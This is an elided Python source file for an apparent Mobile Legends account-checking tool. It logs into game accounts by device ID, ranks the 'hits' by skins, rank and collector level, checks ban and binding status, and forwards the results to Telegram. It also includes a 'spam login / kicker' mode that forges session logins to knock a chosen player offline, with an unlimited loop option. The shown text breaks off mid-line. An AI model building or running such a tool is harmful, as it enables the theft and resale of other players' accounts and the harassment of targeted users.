#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v11.0
# Created by: @PRIME_MICK
# Features: Official Collector + 5-Retry Deep + Brute Force + TG
# ===================================================================
...
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}{ADMIN_USERNAME_DISPLAY}{Fore.LIGHTBLACK_EX} | v11.0
...
HIT_COUNTERS = {
    'sultan_collector': 0, 'mega_collector': 0, 'exalted_collector': 0,
    'renowned_collector': 0, 'expert_collector': 0, 'senior_collector': 0,
    'junior_collector': 0, 'amateur_collector': 0,
    'sultan': 0, 'v2l_active': 0, 'v2l_inactive': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0,
    'mt_bound': 0, 'mt_clear': 0, '3rd_bound': 0, '3rd_clear': 0,
}
...
# ══════════════════════════════════════════════════════════════════
#  COLLECTION POINTS + COLLECTOR LEVEL (Official Server)
# ══════════════════════════════════════════════════════════════════

def calculate_collection_points(skin_info: dict, player_data: dict) -> int:
    """Calculate total Collection Points from skins"""
    total_points = 0
    skin_list = skin_info.get(92, [])
    if not isinstance(skin_list, list):
        skin_list = []
    
    for skin in skin_list:
        if not isinstance(skin, dict): continue
        quality = skin.get(2, 0)
        if quality in (16, 17, 21, 22): total_points += 4000
        elif quality in (11, 12, 13, 14, 15): total_points += 3000
        elif quality in (7, 8, 9, 10): total_points += 2000
        elif quality in (5, 6): total_points += 400
        elif quality in (3, 4): total_points += 200
        elif quality in (1, 2): total_points += 100
        elif quality == 0: total_points += 40
    
    if total_points == 0:
        skin_count = skin_info.get(10) or player_data.get(83, 0) or 0
        total_points = skin_count * 500
    return total_points


def get_collector_level(points: int) -> dict:
    """MLBB Official Server Collector Level (2026) — 8 levels"""
    levels = [
        (280000, "Sultan Collector",   "Sultan"),
        (160000, "Mega Collector",     "Mega"),
        (84000,  "Exalted Collector",  "Exalted"),
        (44000,  "Renowned Collector", "Renowned"),
        (22000,  "Expert Collector",   "Expert"),
        (10000,  "Senior Collector",   "Senior"),
        (4000,   "Junior Collector",   "Junior"),
        (1000,   "Amateur Collector",  "Amateur"),
        (0,      "No Collector",       "None"),
    ]
    for threshold, level_name, short_name in levels:
        if points >= threshold:
            if threshold > 0:
                next_threshold = None
                for t, _, _ in levels:
                ...
                if next_threshold:
                    ...
                    rank_size = range_size // 5
                    if rank_size > 0:
                        rank_idx = min(4, (points - threshold) // rank_size)
                        rank_names = ["V", "IV", "III", "II", "I"]
                        rank = rank_names[rank_idx]
                        return {
                            'level': level_name, 'rank': rank,
                            'display': f"{level_name} {rank}",
                            'points': points, 'next_points': next_threshold,
                        }
            return {
                'level': level_name, 'rank': "I",
                'display': f"{level_name} I",
                'points': points, 'next_points': threshold,
            }
    return {'level': "No Collector", 'rank': "—", 'display': "No Collector",
            'points': points, 'next_points': 1000}


def get_collector_tier(collector_display: str) -> str:
    if "Sultan" in collector_display:    return "sultan_collector"
    if "Mega" in collector_display:      return "mega_collector"
    if "Exalted" in collector_display:   return "exalted_collector"
    if "Renowned" in collector_display:  return "renowned_collector"
    if "Expert" in collector_display:    return "expert_collector"
    if "Senior" in collector_display:    return "senior_collector"
    if "Junior" in collector_display:    return "junior_collector"
    if "Amateur" in collector_display:   return "amateur_collector"
    return "no_collector"


def update_collector_counter(collector_display: str):
    tier = get_collector_tier(collector_display)
    if tier == "no_collector": return
    with COUNTER_LOCK:
        HIT_COUNTERS[tier] = HIT_COUNTERS.get(tier, 0) + 1


def update_moonton_counter(mt: str, third: str):
    with COUNTER_LOCK:
        if mt == 'bound': HIT_COUNTERS['mt_bound'] = HIT_COUNTERS.get('mt_bound', 0) + 1
        else: HIT_COUNTERS['mt_clear'] = HIT_COUNTERS.get('mt_clear', 0) + 1
        if third == 'bound': HIT_COUNTERS['3rd_bound'] = HIT_COUNTERS.get('3rd_bound', 0) + 1
        else: HIT_COUNTERS['3rd_clear'] = HIT_COUNTERS.get('3rd_clear', 0) + 1
...
def format_account_card(device, acc, zone, pd, mode="DIRECT"):
    ...
    collector_display = pd.get('collector_display', 'No Collector')
    collector_points = pd.get('collector_points', 0)
    return "\n".join([
        "=" * 70,
        f"{device} | {acc} | {zone}",
        "=" * 70,
        ...
        f"COLLECTOR LEVEL - {collector_display} ({collector_points:,} pts)",
...
def save_account(account_info, player_data, mode="DIRECT"):
    ...
    if str(nick).lower() in ("unknown", "guest", ""):
        save_error_hit(device, acc, zone, "No nickname", mode)
        return
    ...
    update_collector_counter(player_data.get('collector_display', ''))
    update_moonton_counter(
        player_data.get('mt_status', 'clear'),
        player_data.get('third_party_status', 'clear')
    )
    ...
    with HIT_LIST_LOCK:
        HIT_LIST.append({
            ...
            'collector_display': player_data.get('collector_display', 'No Collector'),
            'collector_points': player_data.get('collector_points', 0),
            'mode': mode,
            'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
        })
    ...
    if should_send_to_telegram(rank_category, skin, highest_rank):
        ...
        tg_message = (
            ...
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>DEVICE ID | ROLE ID | SERVER ID</b>\n"
            f"<code>{device}</code>\n"
            f"<code>{acc}</code> | <code>{zone}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"NAME            - <b>{nick}</b>\n"
            f"SKINS           - <b>{skin}</b>\n"
            f"HEROES          - <b>{player_data.get('hero_count', 0)}</b>\n"
            f"COLLECTOR LEVEL - <b>{collector_display}</b>\n"
            f"HIGH RANK       - <b>{highest_rank}</b>\n"
            f"CURRENT RANK    - <b>{cur_rank}</b>\n"
            f"MOOTON          - <b>{mt}</b>\n"
            f"3RD             - <b>{third}</b>\n"
            f"OFFLINE TIME    - <b>{player_data.get('offline_days', 'N/A')}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"PREMIUM DEVID SEKER\n"
            f"{ADMIN_USERNAME_DISPLAY}"
        )
...
def process_direct(device_id, account_id, zone_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            ...
            # ═══ Collection Points + Collector Level ═══
            points = calculate_collection_points(skin_info, pd)
            collector = get_collector_level(points)
            ...
            return {
                ...
                'data': {
                    ...
                    'collector_display': collector['display'],
        ...
        if data.get("status") == 0 and data.get("data"):
            ...
            return {
                ...
                'data': {
                    ...
                    'skin_count': skin_cnt, 'hero_count': d.get('hero_count', 0),
...
def run_bulk_detail():
    ...
    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} DIRECT - MLBB server (Full info)")
    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} API    - checkton.online (Basic)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} BOTH   - Direct, API fallback")
    ...
    def check_one(dev):
        ...
        if not acc or not zone:
            ...
            sys.stdout.write(
                f"\r{Fore.RED}x{Style.RESET_ALL} [{n}/{len(devices)}] "
        ...
        if status == 'SUCCESS':
            ...
            with LIVE_STATS['lock']:
                LIVE_STATS['banned'] += 1
            sys.stdout.write(f"\r{Fore.RED}x{Style.RESET_ALL} [{n}/{len(devices)}] BANNED\n")
            sys.stdout.flush()
        else:
            with LIVE_STATS['lock']:
                LIVE_STATS['invalid'] += 1
            sys.stdout.write(f"\r{Fore.RED}x{Style.RESET_ALL} [{n}/{len(devices)}] FAIL\n")
            sys.stdout.flush()
    ...
    print(f"  Total      : {LIVE_STATS['checked']:,}")
    print(f"  Normal H   : {Fore.GREEN}{LIVE_STATS['hits']:,}{Style.RESET_ALL}")
    print(f"  Error H    : {Fore.MAGENTA}{LIVE_STATS['error_hits']:,}{Style.RESET_ALL}")
    print(f"  Banned     : {Fore.RED}{LIVE_STATS['banned']:,}{Style.RESET_ALL}")
    print(f"  Invalid    : {LIVE_STATS['invalid']:,}")
    print(f"  Time       : {duration:.1f}s | Speed: {LIVE_STATS['checked']/max(duration,1):.1f}/s")
...
def parse_error_hits_file(filepath: str) -> List[Dict]:
    ...
    try:
        ...
        for block in blocks:
            ...
            dev_match = re.search(r'Device ID\s*:\s*(and_[\w\-]+|ios_[\w\-]+|IOS_[\w\-]+)', block)
            ...
            devices.append({'device': device, 'acc': acc, 'zone': zone, 'reason': reason})
        seen = set()
        unique = []
        for d in devices:
...
def run_deep_check():
    """Menu [9] — Deep Check Error Hits (5 Retries)"""
    print_header("DEEP CHECK — ERROR HITS")

    print(f"{Fore.CYAN}Re-check Error Hits with {DEEP_CHECK_RETRIES} retries per device{Style.RESET_ALL}\n")
    ...
    threads_in = input(f"{Fore.CYAN}Threads (default {DEEP_CHECK_THREADS}): {Style.RESET_ALL}").strip()
    threads = int(threads_in) if threads_in.isdigit() else DEEP_CHECK_THREADS

    print(f"\n{Fore.CYAN}Starting Deep Check ({threads} threads, {DEEP_CHECK_RETRIES} retries)...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}{'-'*80}{Style.RESET_ALL}")
    ...
    def check_one(dev_info):
        ...
        if status == 'HIT':
            with stats['lock']:
                stats['hit'] += 1
                h = stats['hit']; se = stats['still_error']; b = stats['banned']; inv = stats['invalid']
            ...
            with SAVE_LOCK:
                with open(FILES["deep_check_hits"], "a", encoding='utf-8') as f:
                    ...
                    f.write(
                        ...
                        f"Collector    : {d.get('collector_display', 'N/A')}\n"
                        f"Attempts     : {attempts}/{DEEP_CHECK_RETRIES}\n"
                        f"Time         : {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
                        + "=" * 70 + "\n\n"
                    )
            sys.stdout.write(
                f"\r{Fore.GREEN}[HIT]{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{device[:35]}... | Hit:{h} Err:{se} B:{b} I:{inv} ({speed:.1f}/s)\n"
            )
            sys.stdout.flush()
            ...
            with stats['lock']:
                stats['still_error'] += 1
                h = stats['hit']; se = stats['still_error']; b = stats['banned']; inv = stats['invalid']
            still_errors.append({'device': device, 'reason': result.get('reason', 'Unknown'), 'attempts': attempts})
            sys.stdout.write(
                f"\r{Fore.MAGENTA}[ERR]{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{device[:35]}... | Hit:{h} Err:{se} B:{b} I:{inv} ({speed:.1f}/s)\n"
            )
            sys.stdout.flush()
            ...
            with stats['lock']:
                stats['banned'] += 1
                h = stats['hit']; se = stats['still_error']; b = stats['banned']; inv = stats['invalid']
            banned_list.append({'device': device, 'reason': result.get('reason', 'Banned')})
            sys.stdout.write(
                f"\r{Fore.RED}[BAN]{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{device[:35]}... | Hit:{h} Err:{se} B:{b} I:{inv} ({speed:.1f}/s)\n"
            )
            sys.stdout.flush()
            ...
            with stats['lock']:
                ...
                h = stats['hit']; se = stats['still_error']; b = stats['banned']; inv = stats['invalid']
            sys.stdout.write(
                f"\r{Fore.LIGHTBLACK_EX}[INV]{Style.RESET_ALL} [{n}/{len(devices)}] "
                f"{device[:35]}... | Hit:{h} Err:{se} B:{b} I:{inv} ({speed:.1f}/s)\n"
            )
            sys.stdout.flush()
    ...
    if new_hits:
        ...
        for i, h in enumerate(new_hits, 1):
            report_lines += [
                ...
                f"Collector    : {h.get('collector_display', 'N/A')}",
                ""
            ]
    ...
    print(f"  NEW HITS      : {Fore.GREEN}{stats['hit']:,}{Style.RESET_ALL}")
    print(f"  STILL ERROR   : {Fore.MAGENTA}{stats['still_error']:,}{Style.RESET_ALL}")
    print(f"  BANNED        : {Fore.RED}{stats['banned']:,}{Style.RESET_ALL}")
    print(f"  INVALID       : {stats['invalid']:,}")
    print(f"  Duration      : {duration:.1f}s")

    # TG Send
    if new_hits or still_errors:
        if new_hits:
            caption = (
            ...
            send_telegram_document(FILES["deep_check_hits"], caption)
        ...
        send_telegram_document(FILES["deep_check_report"], report_caption)
...
def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    ...
    try:
        ...
        ban_stat = conn.check_ban_status()
        moonton = get_moonton_status(conn, acc, zone)
        conn.cleanup()
        skin_info = skin_info if isinstance(skin_info, dict) else {}
...
def send_session_kick(profile: Dict[str, Any], timeout: float = BRUTEFORCE_TIMEOUT) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        ...
        body_struct = SdpStruct({
            ...
            2: profile['zone_id'], 4: CLIENT_VERSION, 13: CHANNEL, 15: profile['device_id']
        }).data
...
def print_profile_card(data: Dict[str, Any]):
    mt = data.get('mt_status', 'clear').upper()
    third = data.get('third_party_status', 'clear').upper()
    ban = data.get('ban_status', 'NORMAL')
    ban_status = "BANNED" if 'ban' in str(ban).lower() else "NORMAL"
    print(f"\n{Fore.CYAN}{'='*64}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}              ACCOUNT PROFILE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*64}{Style.RESET_ALL}")
    print(f"  Account ID    : {Fore.YELLOW}{data['account_id']}{Style.RESET_ALL}")
    print(f"  Zone ID       : {Fore.YELLOW}{data['zone_id']}{Style.RESET_ALL}")
    print(f"  Nickname      : {Fore.GREEN}{data['nickname']}{Style.RESET_ALL}")
    print(f"  Level         : {Fore.YELLOW}{data['level']}{Style.RESET_ALL}")
    print(f"  Rank          : {Fore.MAGENTA}{data['rank']}{Style.RESET_ALL}")
    print(f"  Max Rank      : {Fore.YELLOW}{data['highest_rank']}{Style.RESET_ALL}")
    print(f"  Skin / Hero   : {Fore.YELLOW}{data['skin_count']} / {data['hero_count']}{Style.RESET_ALL}")
    print(f"  Game Server   : {Fore.CYAN}{data['gs_info']}{Style.RESET_ALL}")
    print(f"  Moonton       : {Fore.RED if mt == 'BOUND' else Fore.GREEN}{mt}{Style.RESET_ALL}")
    print(f"  3rd Party     : {Fore.RED if third == 'BOUND' else Fore.GREEN}{third}{Style.RESET_ALL}")
    print(f"  Ban Status    : {Fore.RED if ban_status == 'BANNED' else Fore.GREEN}{ban_status}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*64}{Style.RESET_ALL}\n")
...
def run_bruteforce_login():
    ...
    while True:
        ...
        target_device = input(f"{Fore.YELLOW}Enter Device ID (0 = Back): {Style.RESET_ALL}").strip()
        if not target_device or target_device in ('0', 'q', 'exit', 'back'):
            return

        print(f"\n{Fore.CYAN}[*] Verifying Device ID...{Style.RESET_ALL}")
        profile = fetch_session_profile(target_device)

        if not profile:
            print(f"\n{Fore.RED}[x] Invalid Device ID, dead, or login failed!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            continue
        ...
        print(f"{Fore.CYAN}{'='*64}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}          SPAM LOGIN / KICKER CONFIGURATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*64}{Style.RESET_ALL}\n")
        print(f"{Fore.WHITE}Target: {Fore.GREEN}{profile['nickname']}{Fore.WHITE} (ID: {Fore.YELLOW}{profile['account_id']}{Fore.WHITE} | Zone: {Fore.YELLOW}{profile['zone_id']}{Fore.WHITE}){Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Single Test (One Kick)")
        ...
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Unlimited (Infinite until stopped)")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Custom (Set your own loop count & delay)")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")
        ...
        if mode_ch in ('', '1'):
            ...
            if success:
                print(f"{Fore.GREEN}[+] SUCCESS - Session connected & kicked!{Style.RESET_ALL}")
                print(f"    Status : {Fore.YELLOW}{status_desc}{Style.RESET_ALL}")
                print(f"    Latency: {Fore.YELLOW}{latency_ms:.1f} ms{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] FAILED - {status_desc} ({latency_ms:.1f} ms){Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            continue
        ...
        if mode_ch == '2': total_loops, delay_sec = 10, 2.0
            ...
            try:
                total_loops = int(input(f"{Fore.CYAN}Loops (0